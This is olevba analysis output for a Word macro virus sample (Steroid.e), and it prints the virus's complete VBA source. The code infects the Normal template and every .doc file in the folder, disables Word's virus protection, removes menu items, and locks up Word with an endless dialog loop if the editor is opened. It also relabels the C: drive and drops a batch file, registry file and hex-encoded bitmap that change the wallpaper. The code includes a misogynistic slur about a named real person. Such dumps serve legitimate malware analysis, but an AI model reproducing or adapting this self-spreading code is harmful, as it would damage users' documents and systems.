olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Steroid.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Steroid.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bitch.bas 
in file: ./Virus.MSWord.Steroid.e - OLE stream: 'Macros/VBA/Bitch'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Sub Steroid()
If Application.ShowVisualBasicEditor Then Call out
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
If Application.ShowVisualBasicEditor Then Call out
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If Application.ShowVisualBasicEditor Then Call out
ActiveDocument.ReadOnlyRecommended = False
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
If Application.ShowVisualBasicEditor Then Call out
Application.VBE.ActiveVBProject.VBComponents("Bitch").Export "c:\startup.log"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Bitch" Then NormInstall = True
Next I
If Application.ShowVisualBasicEditor Then Call out
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Bitch" Then ActivInstall = True
Next I
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then
Call Mover2
With ActiveDocument.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
If Application.ShowVisualBasicEditor Then Call out
If NormInstall = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
Call Mover1
volset = SetVolumeLabel("c:\", "Whore")
End If
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = True
If Application.ShowVisualBasicEditor Then Call out
fuckoff:
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Linda Tripp is a WHORE!!", vbInformation, "VicodinES Macro Virus"
End Sub
Sub FileSave()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
ActiveDocument.Save
Application.ScreenUpdating = True
End Sub
Sub FileSaveAs()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
dialogs(wdDialogFileSaveAs).Show
Application.ScreenUpdating = True
Call Steroid
End Sub
Sub FilePrint()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
dialogs(wdDialogFilePrint).Show
Call Steroid
End Sub
Sub FileClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
Application.Quit
End Sub
Sub AutoOpen()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub AutoExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
End Sub
Sub AutoClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub ViewVBCode()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
End Sub
Sub Caffeine()
' If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Steroid
End If
Loop
End Sub
Sub out()
ShowVisualBasicEditor = False
randomize
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
ShowVisualBasicEditor = False
ActiveDocument.Save
NormalTemplate.Save
Call Caffeine
X = 1
Do While X = 1
testicle = Int(rnd * 700)
dialogs(testicle).Show
Loop
End Sub

Sub Mover1()
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Whore", Object:=wdOrganizerObjectCommandBars
End Sub

Sub Mover2()
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Whore", Object:=wdOrganizerObjectCommandBars
End Sub

Sub Tripp()
Call Drop_reg("c:\tripp.reg")
Call Drop_bmp("C:\start.scr")
Call make_bmp("c:\mstart.bat")
End Sub

Sub Drop_reg(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "REGEDIT4"
Print #hFile, ""
Print #hFile, "[HKEY_CURRENT_USER\Control Panel\Colors]"
Print #hFile, """Background""=""255 255 255"""
Print #hFile, ""
Print #hFile, "[HKEY_USERS\.Default\Control Panel\desktop]"
Print #hFile, """Wallpaper""=""Tripp.bmp"""
Print #hFile, ""
Print #hFile, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup]"
Print #hFile, """Wallpaper""=""tripp.bmp"""
Print #hFile, ""
Print #hFile, ""
Close hFile
End Sub

Sub make_bmp(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "cd\"
Print #hFile, "debug < start.scr > nul"
Print #hFile, "copy tripp.com tripp.bmp"
Print #hFile, "del tripp.com"
Print #hFile, "del start.scr"
Print #hFile, "copy tripp.bmp c:\windows"
Print #hFile, "copy tripp.bmp c:\winnt"
Print #hFile, "del tripp.bmp"
Print #hFile, "start /m /w regedit /S tripp.reg"
Print #hFile, "del tripp.reg"
Print #hFile, "del mstart.bat"
Close hFile
Shell ("c:\mstart.bat"), vbHide
End Sub

Sub Drop_bmp(strFile As String)
    On Error Resume Next
Dim hFile As Long
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
Print #hFile, "N TRIPP.COM"
Print #hFile, "E 0100 42 4D 26 D9 00 00 00 00 00 00 36 00 00 00 28 00 "
Print #hFile, "E 0110 00 00 76 00 00 00 9C 00 00 00 01 00 18 00 00 00"
Print #hFile, "E 0120 00 00 F0 D8 00 00 13 0B 00 00 13 0B 00 00 00 00"
Print #hFile, "E 0130 00 00 00 00 00 00 FD FD FD FC FC FC FB FB FB F9"
Print #hFile, "E 0140 F9 F9 F8 F8 F8 F7 F7 F7 F7 F7 F7 F6 F6 F6 F4 F6"
Print #hFile, "E 0150 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7"
Print #hFile, "E 0160 F4 F6 F7 F4 F6 F7 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2"
Print #hFile, "E 0170 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5"
Print #hFile, "E 0180 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9"
Print #hFile, "E 0190 F2 F5 F9 F1 F6 F9 EF F6 F9 ED F6 F9 F1 F6 F9 F1"
Print #hFile, "E 01A0 F6 F9 F4 F4 FA F4 F4 FA F4 F4 FA F2 F5 FA F2 F5"
Print #hFile, "E 01B0 FA F1 F6 F9 F1 F6 F9 F2 F6 F7 F4 F6 F6 F6 F6 F6"
Print #hFile, "E 01C0 FA F6 F5 FA F6 F5 FA F5 F6 FA F5 F6 FA F5 F6 FA"
Print #hFile, "E 01D0 F5 F6 F8 F6 F6 F8 F6 F6 F8 F6 F6 F8 F6 F6 F6 F6"
Print #hFile, "E 01E0 F6 F6 F6 F6 F6 F6 F6 F6 F6 F6 F4 F6 F6 F4 F6 F6"
Print #hFile, "E 01F0 F4 F6 F6 F4 F6 F6 F4 F5 F9 F4 F5 F9 F4 F5 F9 F4"
Print #hFile, "E 0200 F5 F9 F4 F6 F7 F4 F6 F7 F4 F6 F7 F4 F6 F7 F6 F6"
Print #hFile, "E 0210 F6 F6 F6 F6 F6 F6 F6 F6 F6 F6 F6 F7 F5 F6 F7 F5"
Print #hFile, "E 0220 F6 F7 F5 F6 F7 F5 F6 F6 F6 F4 F6 F6 F4 F6 F7 F1"
Print #hFile, "E 0230 F6 F7 F1 F6 F9 EF F6 F9 F1 F6 F9 F1 F6 F9 F4 F5"
Print #hFile, "E 0240 F9 F4 F6 F7 F6 F5 F7 F6 F6 F6 F4 F7 F5 F2 F7 F5"
Print #hFile, "E 0250 F2 F8 F3 F1 F8 F5 F1 F6 F7 F1 F6 F9 F1 F6 F9 F1"
Print #hFile, "E 0260 F6 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F2 F5 F9 F4 F5"
Print #hFile, "E 0270 F9 F4 F5 F9 F4 F5 F9 F4 F5 F9 F6 F5 F9 F6 F5 F9"
Print #hFile, "E 0280 F6 F5 F9 F4 F5 F9 F3 F5 F6 F5 F9 FA EF F3 F4 F9"
Print #hFile, "E 0290 FD FE FB FF FF FB FF FF 00 00 FF FF FF FD FD FD"
Print #hFile, "E 02A0 F9 F9 F9 F6 F6 F6 F2 F2 F2 F0 F0 F0 EF EF EF EF"
Print #hFile, "E 02B0 EF EF EC EE EF EC EE EF EC EE EF EC EE EE EE ED"
Print #hFile, "E 02C0 EF EC EE EE EE ED EF EC EE EF EC EE EF EA ED F1"
Print #hFile, "E 02D0 EC ED F1 EA ED F1 EC ED F1 EA ED F1 EC ED F1 EA"
Print #hFile, "E 02E0 ED F1 EC ED F1 EA ED F1 EC ED F1 EA ED F1 EC ED"
Print #hFile, "E 02F0 F1 EA ED F1 EC ED F1 EA ED F1 E7 EE F1 E7 EE F1"
Print #hFile, "E 0300 E9 EE F1 EA ED F1 EC EC F2 EC EC F2 EE EC F2 EC"
Print #hFile, "E 0310 EC F2 EA ED F2 EA ED F1 E9 EE EF EA EE EF EC EE"
Print #hFile, "E 0320 EE EE EF ED F0 EE ED F2 EE ED F2 ED EE F2 ED EE"
Print #hFile, "E 0330 F2 ED EE F0 EE EE F0 EE EE F0 EE EE F0 EE EE EE"
Print #hFile, "E 0340 EE EE EE EE EE EE EE EE EE EE EE EC EE EE EC EE"
Print #hFile, "E 0350 EE EC EE EE EC EE EE EC EE EE EC EE EF EC ED F1"
Print #hFile, "E 0360 EE ED F1 EC EE EF EE ED EF EC EE EF EC EE EF EC"
Print #hFile, "E 0370 EE EE EE EE EE EE EE EE EE EE EE EE EF ED EE EF"
Print #hFile, "E 0380 ED EE EF ED EE EF ED EE EF ED EE EE EE EC EE EE"
Print #hFile, "E 0390 EC EE EF EA EE EF E9 EE F1 E9 EE F1 E9 EE F1 EA"
Print #hFile, "E 03A0 ED F1 EC ED F1 EE ED EF EE EE EE EE EF ED EC EF"
Print #hFile, "E 03B0 ED EA F0 EB E9 F0 EB E9 F0 ED EA EE EF EA ED F1"
Print #hFile, "E 03C0 EA ED F1 EA ED F1 EA ED F1 EC ED F1 EC ED F1 EC"
Print #hFile, "E 03D0 ED F1 EC ED F1 EE ED F1 EE ED F1 EE ED F1 EE ED"
Print #hFile, "E 03E0 F1 EE ED F1 F0 EC F1 EE ED F1 EB ED EE EC F0 F1"
Print #hFile, "E 03F0 E9 EB EC FB FF FF FD FF FF FB FF FF 00 00 FD FD"
Print #hFile, "E 0400 FD F9 F9 F9 F3 F3 F3 EC EC EC E6 E6 E6 E2 E2 E2"
Print #hFile, "E 0410 E0 E0 E0 DF DF DF DF DF DF DF DF DF DF DF DF DF"
Print #hFile, "E 0420 E0 DE E1 DF DF DF E0 DE E1 DF DF DF DF DF DF DE"
Print #hFile, "E 0430 E0 DD DF E0 DF DE E0 DD DF E0 DF DE E0 DD DF E0"
Print #hFile, "E 0440 DF DE E0 DD DF E0 DF DE E0 DD DF E0 DF DE E0 DD"
Print #hFile, "E 0450 DF E0 DF DE E0 DD DF E0 DF DE E0 DD DF E0 DA DF"
Print #hFile, "E 0460 E0 D8 E0 E0 DA DF E0 DB DF E0 DF DE E2 DF DE E2"
Print #hFile, "E 0470 E1 DD E3 DF DD E3 DF DE E2 DD DE E2 DB DF E0 DB"
Print #hFile, "E 0480 DF E0 DD DF DF DF E0 DE DF E0 DE E1 DF DE E1 DF"
Print #hFile, "E 0490 DF E1 DF DF E1 DF DF E1 DF DF E1 DF DF DF DF DF"
Print #hFile, "E 04A0 DF DF DF DF DF DF DF DF DF DD DF DF DD DF DF DD"
Print #hFile, "E 04B0 DF DF DD DF DF DB E0 DF DB E0 DF DD DF DF DF DE"
Print #hFile, "E 04C0 E0 DF DE E0 E1 DE E0 DF DE E0 E1 DE E0 DF DF DF"
Print #hFile, "E 04D0 DF DF DF DF DF DF DF DF DF DF E0 DE DF E0 DE DF"
Print #hFile, "E 04E0 E0 DE DF E0 DE DF E0 DC DF E0 DC DF E0 DE DF DF"
Print #hFile, "E 04F0 DF DD DF DF DD DF DF DB E0 DF DB DF E0 DB DF E0"
Print #hFile, "E 0500 DB DF E0 DD DF E0 E1 DE E0 E1 DE E0 E1 DF DF E1"
Print #hFile, "E 0510 DF DE DF E0 DE DB E1 DC DA E1 DC DA E1 DC DD DF"
Print #hFile, "E 0520 DF DD DF E0 DD DF E0 DD DF E0 DD DF E0 DF DE E0"
Print #hFile, "E 0530 DF DE E0 DF DE E0 DF DE E0 E1 DE E0 E1 DE E0 E1"
Print #hFile, "E 0540 DE E0 E1 DE E0 E1 DE E0 E3 DE E0 E1 DE E0 DD DC"
Print #hFile, "E 0550 DE DF E1 E2 DD DC DE FD FF FF FF FE FF FD FF FF"
Print #hFile, "E 0560 00 00 F9 F9 F9 F4 F4 F4 EB EB EB E2 E2 E2 DA DA"
Print #hFile, "E 0570 DA D5 D5 D5 D3 D3 D3 D2 D2 D2 D1 D1 D1 D1 D1 D1"
Print #hFile, "E 0580 D3 D1 D0 D3 D1 D0 D3 D1 D0 D3 D1 D0 D3 D1 D0 D3"
Print #hFile, "E 0590 D1 D0 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0"
Print #hFile, "E 05A0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2"
Print #hFile, "E 05B0 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0 D2 CF"
Print #hFile, "E 05C0 D1 D2 CC D1 D2 CA D2 D2 CD D1 D2 CF D1 D2 D1 D0"
Print #hFile, "E 05D0 D4 D3 CF D4 D3 CF D5 D3 CF D5 D1 D0 D4 CF D0 D4"
Print #hFile, "E 05E0 CF D1 D2 CD D2 D1 CF D1 D1 CF D2 D0 D1 D2 CE D1"
Print #hFile, "E 05F0 D2 CE D3 D1 D1 D3 D1 D1 D3 D1 D1 D3 D1 D1 D1 D1"
Print #hFile, "E 0600 D1 D1 D1 D1 D1 D1 D1 D1 D1 D1 CF D1 D1 CF D1 D1"
Print #hFile, "E 0610 CF D1 D1 CF D1 D1 CD D2 D1 CD D2 D1 CD D2 D1 CF"
Print #hFile, "E 0620 D1 D1 D1 D0 D2 D3 D0 D2 D3 D0 D2 D3 D0 D2 D3 D1"
Print #hFile, "E 0630 D1 D3 D1 D1 D1 D1 D1 D1 D1 D1 D1 D2 D0 D1 D2 D0"
Print #hFile, "E 0640 D1 D2 D0 D1 D2 D0 D1 D2 CE D1 D2 CE D1 D2 CE D1"
Print #hFile, "E 0650 D2 CE D1 D1 D1 CF D1 D1 CF D1 D1 CD D2 D1 CD D1"
Print #hFile, "E 0660 D2 CD D1 D2 CF D1 D2 D1 D0 D2 D3 D0 D2 D5 D0 D1"
Print #hFile, "E 0670 D5 D0 D1 D3 D1 D0 D1 D2 CE CD D3 CE CC D4 CD CC"
Print #hFile, "E 0680 D3 CE CF D1 D1 D1 D0 D2 D1 D0 D2 D1 D0 D2 D1 D0"
Print #hFile, "E 0690 D2 D1 D0 D2 D3 D0 D2 D3 D0 D2 D3 D0 D2 D3 D0 D2"
Print #hFile, "E 06A0 D5 D0 D2 D5 D0 D2 D5 D0 D2 D5 D0 D2 D5 D0 D2 D3"
Print #hFile, "E 06B0 D0 D2 D1 CE D0 D2 D1 D3 CF CE D0 FC FB FD FD FC"
Print #hFile, "E 06C0 FE FB FA FC 00 00 F2 F2 F2 EF EF EF E7 E7 E7 DC"
Print #hFile, "E 06D0 DC DC CC CC CC CA CA CA CA CA CA C4 C4 C4 C8 C8"
Print #hFile, "E 06E0 C8 C7 C7 C7 C1 BF BE C9 C7 C6 CB C9 C8 C4 C2 C1"
Print #hFile, "E 06F0 C6 C4 C3 C2 C0 BF C1 C0 C2 C0 BF C1 C2 C1 C3 C5"
Print #hFile, "E 0700 C4 C6 C3 C2 C4 BE BD BF BE BD BF C0 BF C1 C0 BF"
Print #hFile, "E 0710 C1 C3 C2 C4 BF BE C0 C4 C3 C5 C4 C3 C5 C2 C1 C3"
Print #hFile, "E 0720 C9 C8 CA C2 C4 C5 BD C2 C3 C1 C9 C9 C2 C6 C7 C2"
Print #hFile, "E 0730 C4 C5 C6 C5 C9 C6 C2 C7 C5 C1 C7 CA C6 CC C3 C2"
Print #hFile, "E 0740 C6 C1 C2 C6 BF C1 C2 BE C3 C2 C3 C5 C5 BF C2 C0"
Print #hFile, "E 0750 BD BE BA C0 C1 BD C4 C2 C2 C3 C1 C1 C4 C2 C2 C5"
Print #hFile, "E 0760 C3 C3 C5 C5 C5 C5 C5 C5 C4 C4 C4 C2 C2 C2 BF C1"
Print #hFile, "E 0770 C1 BB BD BD C8 CA CA C0 C2 C2 C3 C8 C7 B8 BD BC"
Print #hFile, "E 0780 BD C2 C1 C6 C8 C8 C2 C1 C3 C6 C3 C5 C4 C1 C3 C3"
Print #hFile, "E 0790 C0 C2 C5 C3 C3 C4 C2 C2 C2 C2 C2 C9 C9 C9 C6 C7"
Print #hFile, "E 07A0 C5 BF C0 BE CA CB C9 C7 C8 C6 BE BF BB CC CD C9"
Print #hFile, "E 07B0 C1 C2 BE C3 C4 C0 C0 C0 C0 BC BE BE BF C1 C1 C1"
Print #hFile, "E 07C0 C6 C5 BE C2 C3 BD C1 C2 C2 C4 C5 C4 C3 C5 C3 C0"
Print #hFile, "E 07D0 C2 CD C8 C9 CA C5 C6 C4 C2 C1 CA CB C7 BB C1 BC"
Print #hFile, "E 07E0 C1 C9 C2 BF C6 C1 C2 C4 C4 C5 C4 C6 C5 C4 C6 C6"
Print #hFile, "E 07F0 C5 C7 C5 C4 C6 C3 C2 C4 C5 C2 C4 C5 C2 C4 C7 C4"
Print #hFile, "E 0800 C6 C7 C4 C6 C3 BE C0 CB C6 C8 CC C7 C9 C6 C1 C3"
Print #hFile, "E 0810 C9 C4 C6 C5 C2 C4 CB C8 CA C1 C0 C2 C1 C0 C2 FF"
Print #hFile, "E 0820 FE FF FE FD FF FF FE FF 00 00 FF FF FF F4 F4 F4"
Print #hFile, "E 0830 E3 E3 E3 D6 D6 D6 CE CE CE D4 D4 D4 B0 B0 B0 BE"
Print #hFile, "E 0840 BE BE B6 B6 B6 BA BA BA B6 B6 B6 B9 BA B8 BB B9"
Print #hFile, "E 0850 B9 B6 B7 B5 BC BA BA B5 B5 B5 BA B9 BB B7 B9 BA"
Print #hFile, "E 0860 B9 B8 BA B7 B9 BA B9 B8 BA B8 BA BB BD BC BE BD"
Print #hFile, "E 0870 BF C0 B6 B5 B7 B8 BA BB B6 B5 B7 B8 BA BB BA B9"
Print #hFile, "E 0880 BB B4 B6 B7 BA B9 BB B4 B6 B7 B1 B6 B7 B0 B8 B8"
Print #hFile, "E 0890 B5 BA BB B7 BB BC B9 B8 BC B8 B7 BB B9 B5 BB B6"
Print #hFile, "E 08A0 B4 BA BB BA BE B3 B4 B8 B5 B9 BA B7 BB BC B5 B7"
Print #hFile, "E 08B0 B7 BA BB B9 C0 C1 BF BB B9 B8 BB B9 B9 BA B8 B8"
Print #hFile, "E 08C0 B9 B7 B7 BA B8 B8 BB B9 B9 BA BA BA B9 B9 B9 B8"
Print #hFile, "E 08D0 B8 B8 BC BC BC BF C1 C1 B0 B2 B2 C0 C2 C2 A5 A7"
Print #hFile, "E 08E0 A7 BF C4 C3 B8 BD BC B6 B8 B8 BE BD BF BA B9 BB"
Print #hFile, "E 08F0 B8 B5 B7 B5 B4 B6 B9 B6 B8 B9 B9 B9 BA BA BA B8"
Print #hFile, "E 0900 B8 B8 BE BE BE B8 B9 B7 BA BB B9 B6 B7 B5 B7 B8"
Print #hFile, "E 0910 B6 BC BD B9 BE BF BB B6 B7 B5 C2 C2 C2 BB BD BD"
Print #hFile, "E 0920 B6 B8 B8 AF B4 B3 AE B2 B3 B4 B8 B9 B5 B9 BA B4"
Print #hFile, "E 0930 B6 B7 B6 B3 B5 B7 B4 B6 B5 B3 B3 AE AC AB BB BC"
Print #hFile, "E 0940 BA B5 BB B6 B5 BC B7 B2 B9 B4 B5 B7 B7 B6 B8 B9"
Print #hFile, "E 0950 B7 B9 BA B8 BA BB B8 BA BB B9 B8 BA B9 B8 BA B9"
Print #hFile, "E 0960 B8 BA BD BC BE BF BC BE BA B7 B9 C0 BD BF C0 BD"
Print #hFile, "E 0970 BF B8 B5 B7 BE B9 BB BB B8 BA B4 B3 B5 B5 B7 B8"
Print #hFile, "E 0980 C0 BF C1 FA FC FD FD FC FE F4 F6 F7 00 00 F7 F7"
Print #hFile, "E 0990 F7 E9 E9 E9 D8 D8 D8 D4 D4 D4 C9 C9 C9 A9 A9 A9"
Print #hFile, "E 09A0 07 07 07 01 01 01 00 00 01 01 03 04 00 02 03 00"
Print #hFile, "E 09B0 00 00 00 00 01 00 00 00 06 05 07 02 04 05 00 02"
Print #hFile, "E 09C0 03 00 00 03 00 00 03 00 00 03 00 00 03 00 00 03"
Print #hFile, "E 09D0 00 00 03 00 00 03 00 00 03 00 03 07 00 00 03 00"
Print #hFile, "E 09E0 02 06 02 03 07 00 00 03 00 00 03 00 00 03 00 06"
Print #hFile, "E 09F0 09 00 00 03 00 00 03 00 00 04 00 00 04 00 00 04"
Print #hFile, "E 0A00 02 00 06 00 00 04 00 00 04 00 00 03 00 02 03 00"
Print #hFile, "E 0A10 03 04 02 04 04 00 01 00 02 00 00 04 00 00 06 01"
Print #hFile, "E 0A20 02 04 00 00 04 00 00 02 00 00 02 00 00 02 00 00"
Print #hFile, "E 0A30 02 00 00 00 00 00 00 00 00 00 00 00 04 04 04 00"
Print #hFile, "E 0A40 00 00 05 07 07 00 00 00 00 00 00 01 03 03 00 00"
Print #hFile, "E 0A50 01 00 00 03 00 00 03 05 07 08 05 04 06 02 04 05"
Print #hFile, "E 0A60 06 08 09 00 00 00 00 00 00 00 00 00 07 07 07 0B"
Print #hFile, "E 0A70 0C 0A 0E 0F 0D 00 01 00 01 02 00 00 01 00 00 00"
Print #hFile, "E 0A80 00 00 00 00 06 08 09 00 03 04 00 01 04 02 07 0A"
Print #hFile, "E 0A90 00 03 06 00 00 03 00 00 03 01 00 02 0E 0E 0E 00"
Print #hFile, "E 0AA0 01 00 00 03 01 00 02 00 00 02 00 00 03 00 00 00"
Print #hFile, "E 0AB0 01 00 00 03 00 00 03 00 00 03 00 00 03 00 00 03"
Print #hFile, "E 0AC0 00 00 03 00 00 03 00 00 03 00 00 03 00 00 03 01"
Print #hFile, "E 0AD0 00 04 00 00 03 00 00 03 02 00 03 00 00 03 02 04"
Print #hFile, "E 0AE0 05 00 01 02 00 00 01 02 06 07 03 05 06 00 00 01"
Print #hFile, "E 0AF0 00 00 F5 F5 F5 EE EE EE DD DD DD D1 D1 D1 C6 C6"
Print #hFile, "E 0B00 C6 BB BB BB 09 09 09 42 44 44 50 52 53 55 57 58"
Print #hFile, "E 0B10 56 58 59 52 55 59 4E 51 55 4F 52 56 59 5C 60 60"
Print #hFile, "E 0B20 63 67 6A 6D 71 64 69 6C 64 69 6C 68 6D 70 65 6A"
Print #hFile, "E 0B30 6D 5A 5F 62 53 58 5B 53 58 5B 57 5C 5F 5B 60 63"
Print #hFile, "E 0B40 53 58 5B 58 5D 60 5A 5F 62 53 58 5B 56 5B 5E 58"
Print #hFile, "E 0B50 5D 60 55 5C 5F 55 5E 61 63 6A 6D 71 76 79 70 73"
Print #hFile, "E 0B60 78 65 68 6D 58 5B 60 4C 4F 54 60 64 69 6F 75 7A"
Print #hFile, "E 0B70 65 6A 6D 58 5C 5D 58 5A 5B 2D 2B 2B 13 0E 0F 17"
Print #hFile, "E 0B80 12 11 16 11 12 12 0D 0E 0E 09 0A 0C 07 08 0D 08"
Print #hFile, "E 0B90 09 0E 0C 0C 10 0E 0E 11 0F 0F 21 1F 1F 11 11 11"
Print #hFile, "E 0BA0 00 00 00 67 67 67 FF FF FF FA FC FC FD FF FF F3"
Print #hFile, "E 0BB0 F5 F6 CE CF D3 C3 C6 CA CD D0 D4 E9 EC F0 EB EE"
Print #hFile, "E 0BC0 F2 E5 E7 E8 E8 EA EB E2 E4 E5 EF EE F0 F1 F1 F1"
Print #hFile, "E 0BD0 EB EB EB D3 D3 D3 99 99 99 0F 10 0E 0D 0E 0C 10"
Print #hFile, "E 0BE0 10 10 12 12 12 37 36 38 5E 60 61 5F 64 65 57 5E"
Print #hFile, "E 0BF0 61 5A 61 64 57 5E 61 56 5B 5E 59 5C 60 4D 4E 52"
Print #hFile, "E 0C00 47 49 4A 13 15 15 00 00 00 01 04 02 22 27 25 5D"
Print #hFile, "E 0C10 64 61 52 5A 5A 54 5B 5E 53 5A 5D 50 57 5A 51 56"
Print #hFile, "E 0C20 59 51 56 59 4E 53 56 49 4E 51 47 4A 4E 47 4A 4E"
Print #hFile, "E 0C30 41 44 48 45 48 4C 45 46 4A 3E 3F 43 45 46 4A 45"
Print #hFile, "E 0C40 46 4A 3A 3E 3F 3A 3F 40 2F 34 35 28 2D 2E 1F 24"
Print #hFile, "E 0C50 25 00 04 05 00 00 F4 F4 F4 F1 F1 F1 E1 E1 E1 D1"
Print #hFile, "E 0C60 D1 D1 C1 C1 C1 BA BA BA 00 00 01 55 57 58 54 55"
Print #hFile, "E 0C70 59 4D 50 54 4F 52 56 4F 53 58 4B 4F 54 49 4D 52"
Print #hFile, "E 0C80 53 57 5C 61 67 6C 61 67 6C 58 5E 63 59 5F 64 62"
Print #hFile, "E 0C90 68 6D 5E 64 69 4E 54 59 48 4E 53 4D 53 58 62 68"
Print #hFile, "E 0CA0 6D 64 6A 6F 58 5E 63 5A 60 65 5D 63 68 54 5A 5F"
Print #hFile, "E 0CB0 56 5C 61 5C 62 67 5D 66 6A 5D 66 6A 60 66 6B 65"
Print #hFile, "E 0CC0 6B 70 6A 6D 75 60 63 6B 54 5A 61 54 5A 61 4A 52"
Print #hFile, "E 0CD0 59 58 61 65 57 5D 62 56 5B 5E 58 57 59 20 1B 1C"
Print #hFile, "E 0CE0 0B 05 06 16 0E 0F 17 11 12 12 0C 0D 0D 07 08 0B"
Print #hFile, "E 0CF0 05 06 0C 06 07 0F 0A 0B 12 0D 0E 11 0F 0F 10 0E"
Print #hFile, "E 0D00 0E 13 11 11 02 00 00 D4 D2 D2 FF FF FF FA FA FA"
Print #hFile, "E 0D10 FF FF FF FD FF FF D9 DC E0 C4 C8 CD BC C0 C5 DB"
Print #hFile, "E 0D20 DF E4 ED F1 F6 E8 EB EF E9 EC F0 E1 E5 E6 E0 E2"
Print #hFile, "E 0D30 E3 EC EE EF F5 F4 F6 E8 E7 E9 B4 B3 B5 0E 0E 0E"
Print #hFile, "E 0D40 00 00 00 0D 0D 0D 02 00 01 1C 1B 1F 55 56 5A 60"
Print #hFile, "E 0D50 65 68 51 5A 5E 55 60 64 58 63 67 5C 65 69 50 56"
Print #hFile, "E 0D60 5B 47 4C 4F 54 57 5B 26 28 29 04 06 06 00 01 00"
Print #hFile, "E 0D70 0E 13 11 50 56 55 5B 64 67 5B 66 6A 5B 64 68 55"
Print #hFile, "E 0D80 5E 62 54 5D 61 53 5C 60 4F 55 5A 47 4D 52 44 4A"
Print #hFile, "E 0D90 4F 42 48 4D 3A 3E 43 3C 40 45 38 3C 41 2F 33 38"
Print #hFile, "E 0DA0 34 38 3D 33 38 3B 32 3A 3A 38 40 40 3B 43 43 39"
Print #hFile, "E 0DB0 41 41 2F 37 37 00 01 01 00 00 F9 F9 F9 EE EE EE"
Print #hFile, "E 0DC0 DA DA DA CE CE CE C8 C8 C8 BE C0 C0 00 00 01 4F"
Print #hFile, "E 0DD0 53 54 5A 5D 61 4E 52 57 50 54 59 51 57 5E 50 56"
Print #hFile, "E 0DE0 5D 4C 52 59 51 57 5E 62 6A 71 5E 66 6D 56 5F 63"
Print #hFile, "E 0DF0 56 5F 63 5D 66 6A 5A 63 67 50 59 5D 51 5A 5E 5B"
Print #hFile, "E 0E00 64 68 68 71 75 6A 73 77 5B 64 68 5C 65 69 5F 68"
